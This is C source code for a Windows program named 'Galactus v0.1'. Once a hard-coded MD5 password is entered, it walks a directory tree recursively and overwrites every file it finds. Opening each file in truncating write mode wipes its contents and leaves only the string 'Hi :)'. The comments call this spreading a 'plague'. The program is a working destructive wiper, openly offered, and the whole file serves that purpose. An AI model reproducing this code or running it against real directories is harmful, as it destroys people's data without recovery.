#include <Windows.h>
#include <stdio.h>
#include <tchar.h>
#include <wchar.h>
#include <io.h>
char cMD5PassHash[] = "\xcc\x03\xe7\x47\xa6\xaf\xbb\xcb\xf8\xbe\x76\x68\xac\xfe\xbe\xe5"; // md5(test123) + '\0' = 17
BOOL GetMD5Hash(char *buffer,			//input buffer
				BYTE *byteFinalHash);	//output buffer 

u_long FileSizeByName(wchar_t *sFileName)
{
	FILE *fp = NULL;
#ifdef _DEBUG
	wprintf_s(L"sFileName is: %s\n", sFileName);
#endif 
	if(_wfopen_s(&fp, sFileName, L"r")!=0)
	{
#ifdef _DEBUG
		wprintf_s(L"Error opening file for READING: %s\n", sFileName);
#endif
		return 1;
	}
	HANDLE hFile = INVALID_HANDLE_VALUE;
	hFile = (HANDLE)_get_osfhandle(_fileno(fp)); // get handle associated with specific file descriptor (get file descriptor from stream)
	u_long  iFileSize = 0;
	iFileSize = GetFileSize(hFile, NULL);
	fclose(fp);
#ifndef _DEBUG
	CloseHandle(hFile); // this will ALWAYS throw an exception if run under a debugger, but good higene if run under "production"
#endif 
#ifdef _DEBUG
	wprintf_s(L"File Size: %d\r\n", iFileSize);
#endif
	return iFileSize;
}

int corrupt(wchar_t *sTarget)
{
	u_long iFileSize = FileSizeByName(sTarget);
#ifdef _DEBUG
	wprintf_s(L"iFileSize is : %d\n", iFileSize);
#endif
	FILE *fp = NULL;
	if(_wfopen_s(&fp, sTarget, L"w+")!=0)
	{
#ifdef _DEBUG
		wprintf_s(L"Error opening file for WRITING: %s\n", sTarget);
#endif
		return 1;
	}
	fseek ( fp , iFileSize-5, SEEK_SET ); // 5 bytes for the friendly salutation :>
	fputs("Hi :)",fp);
	fclose(fp);
	return 0;
}

int ListDirectoryContents(const wchar_t *sDir)
{ 
	WIN32_FIND_DATA FindFileData ={0};
	HANDLE hFind = INVALID_HANDLE_VALUE; 
	wchar_t sPath[MAX_PATH] = {0}; 

	wcscpy_s(sPath, MAX_PATH, sDir); 
	wcscat_s(sPath, MAX_PATH, L"\\*"); 

	hFind = FindFirstFile(sPath, &FindFileData);
	if(INVALID_HANDLE_VALUE == hFind )
	{ 

		wprintf_s(L"Path not found: [%s]\n", sDir); 
		return 1; 
	} 

	do
	{ 
		if(wcscmp(FindFileData.cFileName, L".") != 0 && wcscmp(FindFileData.cFileName, L"..") != 0) // remove `.` & `..`
		{ 
			wsprintf(sPath, L"%s\\%s", sDir, FindFileData.cFileName); 
			if(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 	//Is the entity a Folder? 
			{ 
				wprintf_s(L"[*] Directory: %s\n", sPath); 
				ListDirectoryContents(sPath); //Recursion, keep the plague going... 
			} 
			else{ 
				wprintf_s(L"File: %s\n", sPath); 
				corrupt(sPath);
			} 
		}
	} 
	while(FindNextFile(hFind, &FindFileData)); //Find the next file. 
	FindClose(hFind); //Always, Always, clean things up! 
	return 0; 
} 


//int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPreviousInstance, LPSTR lpCmdLine, int iCmdShow)
int _tmain(int argc, TCHAR *argv[])
{
	char cUserInput[32]={0};
	wprintf_s(L"...................\n...Galactus v0.1...\n...................");
	wprintf_s(L"\n\n[*] Password:\n");
	fgets(cUserInput, sizeof(cUserInput), stdin);
#ifdef _DEBUG
	printf_s("Password is: %s\n", cUserInput);
#endif
	cUserInput[strlen(cUserInput)-1] = '\0'; //replace \n with \0
	BYTE byteHashbuffer[16] = {0}; //where the computed hash will be stored
	GetMD5Hash(cUserInput, byteHashbuffer);
#ifdef _DEBUG
	for( int i=0; i < 16; i++)
	{
		wprintf_s(L"%02x",byteHashbuffer[i]); //the %02x means output 2 digit hex, with leading zeros.
	}
	wprintf_s(L"\n");
#endif

	int i = memcmp(byteHashbuffer,cMD5PassHash,16); //MD5 hash is 16 bytes, we need to compare 16 bytes. 
	if(i!=0) //anything other than 0 is they don't match.
	{
		wprintf_s(L"[-] ... wrong password!\n\n[-] Press [Enter] to exit.\n");
		getchar();
		exit(1);
	};

	wchar_t cDstDir[MAX_PATH] = {0};
	if(argc != 2)
	{
		GetCurrentDirectory(MAX_PATH, cDstDir);
		//StringCchCopy(cDstDir, MAX_PATH, TEXT("c:"));
	}
	else
	{
		wcscpy_s(cDstDir, MAX_PATH, argv[1]);
	}

	wprintf_s(L"cDstDir is:%s \n\n\n    \"I hope you know what you're doing.\"\n\n\n[*] To proceed press [Enter]...\n", cDstDir);
	getchar();
	ListDirectoryContents(cDstDir);
	return 0;
}

//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
//code taken from URI below... well, I modified it a LOT, go for the link to see how it looked like...
//http://nagareshwar.securityxploded.com/2010/10/22/cryptocode-generate-md5-hash-using-windows-cryptography-library/
//////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////
//
//  Compute the MD5 checksum for input buffer
//
BOOL GetMD5Hash(char *buffer,             //input buffer
				BYTE *byteFinalHash)    //ouput hash buffer
{
	BOOL bResult = FALSE;
	HCRYPTPROV hProv = 0;
	HCRYPTHASH hHash = 0;

	// Get handle to the crypto provider
	if (!CryptAcquireContext(&hProv, NULL, MS_DEF_PROV, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT))
	{
		printf("\nCryptAcquireContext failed, Error=0x%.8x", GetLastError());
		return FALSE;
	}

	//Specify the Hash Algorithm here
	if (!CryptCreateHash(hProv, CALG_MD5, 0, 0, &hHash))
	{
		printf("\nCryptCreateHash failed,  Error=0x%.8x", GetLastError());
		goto EndHash;
	}

	//Create the hash with input buffer
	if (!CryptHashData(hHash, (const BYTE*) buffer, strlen(buffer), 0))
	{
		printf("\nCryptHashData failed,  Error=0x%.8x", GetLastError());
		goto EndHash;
	}
	DWORD dwTemp = 16;
	DWORD *pdwDataLen = &dwTemp;


	//Now get the computed hash
	if (CryptGetHashParam(hHash, HP_HASHVAL, byteFinalHash, pdwDataLen, 0))
	{
		printf("\n[*] Hash Computed successfully:\n");
		bResult = TRUE; 
	}
	else
	{
		printf("\nCryptGetHashParam failed,  Error=0x%.8x", GetLastError());
	}


EndHash:

	if( hHash )
		CryptDestroyHash(hHash);

	if( hProv )
		CryptReleaseContext(hProv, 0);

	return bResult; 
}  